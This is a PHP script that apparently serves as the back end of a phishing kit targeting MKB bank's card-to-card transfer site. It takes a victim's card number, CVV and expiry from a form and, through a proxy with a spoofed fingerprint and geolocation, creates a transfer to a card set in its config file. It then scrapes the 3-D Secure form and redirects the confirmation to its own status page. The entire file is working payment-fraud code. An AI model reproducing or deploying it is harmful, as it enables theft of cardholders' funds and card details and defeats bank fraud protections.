<?php



include $_SERVER['DOCUMENT_ROOT'].'/config.php';



           $ch = curl_init("https://pay.mkb.ru/pages/captcha");
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, true);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
                    "code" => $_POST["captcha"]
                ]));
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    "Cookie: session_c2c=" . $_POST['session_c2c'],
                    "Origin: https://pay.mkb.ru",
                    "Referer: https://pay.mkb.ru/pages/captcha",
                    "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
                ]);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
//$param =[
//  'code'=> $_POST['captcha']
//];
//curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
//curl_setopt($ch, CURLOPT_PROXY, $proxy);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
//curl_setopt($ch, CURLOPT_POSTFIELDS, "{code:'".$_POST['captcha']."'}");
$com = curl_exec($ch);
$tsf1 = curl_getinfo($ch);
curl_close($ch);

 if (strstr($com, "C Вашего IP-адреса поступило необычно много запросов") !== false){
                    http_response_code(301);
                    header("Location: /?amount=" . $_POST['amount'] . "&error=Неверно введен код подтверждения");

                    exit();
                }
                
   
//$tsf = curl_ge($ch);




getPost();



$cookies['session_c2c'] = $_POST['session_c2c'];
//Получили сессию


$json["CardSource"] = $_POST['card_number'];
$json["CardDestination"] = $card;
$json["Sum"] = $_POST['amount'];
$ch = curl_init("https://pay.mkb.ru/transfer/comission");

curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Host: pay.mkb.ru",
    "Accept: application/json, text/javascript, */*; q=0.01",
    "Referer: https://pay.mkb.ru/",
    "User-Agent: ".getallheaders()['User-Agent'],
    "Content-Type: application/json; charset=utf-8",
    "Cookie: session_c2c=" . $cookies['session_c2c'],
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json));
$comission = curl_exec($ch);
curl_close($ch);

$com = json_decode($comission,1);


if($com['NeedCaptcha'] == true) {

    $im = base64_encode(explode("\r\n\r\n", $session)[2]);

    include('text.php');

    exit();

}

    $geo["Fingerprint"] = md5(rand(0, 999999));
            $geo["CardSource"] = $_POST['card_number'];
            $geo["GeoDataPos"] = "0.000000,0.000000";
            $geo["GeoDataText"] = "";

$ch = curl_init("https://pay.mkb.ru/check_client");
curl_setopt($ch, CURLOPT_URL, "https://pay.mkb.ru/check_client");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Referer: https://pay.mkb.ru/",
    "User-Agent: ".getallheaders()['User-Agent'],
    "Content-Type: application/json; charset=utf-8",
    "Cookie: session_c2c=" . $cookies['session_c2c'],
));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($geo));
$pos = curl_exec($ch);
curl_close($ch);
//$pos если {"Value":true} то все ок



$json["Comission"] = $com['Value']['Comission'];
$json["ComissionCurrency"] = $com['Value']['CurrencyCode'];
$json["Cvv"] = $_POST['cvv'];
$json["Expiry"] = $_POST['expm']."/".$_POST['expy'];
$json["Total"] = $json["Sum"] + (int)(explode(",", $com['Value']['Comission'])[0]) . "," . explode(",", $com['Value']['Comission'])[1];



$ch = curl_init("https://pay.mkb.ru/create_operation");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($json, JSON_UNESCAPED_SLASHES));
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    "Referer: https://pay.mkb.ru/",
    "User-Agent: ". getallheaders()['User-Agent'],
    "Content-Type: application/json; charset=utf-8",
    "Cookie: session_c2c=" . $cookies['session_c2c'],
    "Origin: https://pay.mkb.ru",
));
curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
$operation = curl_exec($ch);
      $response = json_decode($operation, true);
      

if($response['NeedCaptcha'] == true) {

    $im = base64_encode(explode("\r\n\r\n", $session)[2]);

    include('text.php');

    exit();

}

            curl_close($ch);
            if($response['IsSuccess'] == 'true'){
                
                
                     $ch = curl_init("https://pay.mkb.ru/pages/secure3d");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                "Cookie: session_c2c=" . $cookies['session_c2c'],
                "Referer: https://pay.mkb.ru/",
             "User-Agent: ". getallheaders()['User-Agent'],
            ]);
                curl_setopt($ch, CURLOPT_PROXY, $proxy);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
                   $response = curl_exec($ch);
            curl_close($ch);
            
            preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $response, $matches);

$cookies = array();
foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
}


$ch = curl_init("https://pay.mkb.ru/secure3dform");
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_HEADER, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                "Cookie: complete=; session_c2c=" . $cookies['session_c2c'] . "; __sp=" . $cookies['__sp'],
                "Referer: https://pay.mkb.ru/pages/secure3d",
                "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
            ]);
                curl_setopt($ch, CURLOPT_PROXY, $proxy);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);

                $response = curl_exec($ch);
            curl_close($ch);
            
     
            
            preg_match_all("#<form id='FrmHtmlDirect3DSOnly' name='FrmHtmlDirect3DSOnly' action='(.+?)' method='post'>#is", $response, $action);
preg_match_all("#<input id='PaReq' type='hidden' value='(.+?)' name='PaReq'>#is", $response, $PaReq);
preg_match_all("#<input id='MD' type='hidden' value='(.+?)' name='MD'>#is", $response, $MD);
preg_match_all("#<input id='TermUrl' type='hidden' value='(.+?)' name='TermUrl'>#is", $response, $TermUrl);

file_put_contents("temp/" . $MD[1][0], json_encode(['TermUrl'=>$TermUrl[1][0],'sp'=>$cookies['__sp'],'session_c2c'=>$cookies['session_c2c']], JSON_UNESCAPED_UNICODE));
        
                
            }
            
            
            $ab = isset($_SERVER['HTTPS']) ? 'https://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php' : 'https://' . $_SERVER['SERVER_NAME'] . dirname($_SERVER['REQUEST_URI']) . '/status.php';
?>
</html>
</body>
<form id="postForm" action="<?=$action[1][0];?>" method="POST">
    <input type="hidden" name="PaReq" value="<?=$PaReq[1][0];?>">
    <input type="hidden" name="TermUrl" value="<?=$ab;?>">
    <input type="hidden" name="MD" value="<?=$MD[1][0];?>">
</form><script>document.getElementById('postForm').submit();</script></body></html>